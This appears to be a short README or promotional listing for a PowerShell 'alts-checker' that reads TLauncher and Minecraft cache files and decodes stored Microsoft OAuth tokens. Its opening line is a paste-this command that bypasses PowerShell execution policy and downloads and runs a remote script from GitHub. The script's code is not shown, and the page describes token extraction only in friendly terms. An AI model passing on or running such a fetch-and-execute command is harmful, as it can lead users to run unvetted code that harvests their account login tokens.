- **powershell -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/OnlyDehBest/alts-checker/main/alts-checker.ps1')"**

🔐 **PowerShell Script to Extract and Decode TLauncher Minecraft Accounts with Microsoft Tokens**

This PowerShell script retrieves Minecraft account information from TLauncher and user cache files, and optionally decodes Microsoft OAuth tokens to reveal token claims.

💡 **Functions Included**:
- Decode-Jwt
  - Accepts a JWT (JSON Web Token) as input.
  - Splits the token into header, payload, and signature.
  - Converts the Base64 URL-safe encoded payload into a readable UTF-8 JSON object.
  - Returns the decoded claims from the token.
- Get-TLauncherAccounts
  - Reads the TLauncher profile file located at $env:APPDATA\.minecraft\TlauncherProfiles.json.
  - Iterates through all stored accounts, displaying:
  - Display name
  - UUID
  - Account type
  - Whether a Microsoft token (accessToken or id_token) is present (shown with ✅ or ❌)
  - If a Microsoft token is found, it decodes and displays the JWT claims in a formatted table.
- Get-UserCacheAccounts
  - Searches recursively for usercache*.json files in the .minecraft folder.
  - Parses these files and displays any found account names and UUIDs.

📌 **Execution**:
At the end, both **Get-TLauncherAccounts** and **Get-UserCacheAccounts** are invoked, providing a complete overview of accounts stored locally by TLauncher, including Microsoft login info when available.
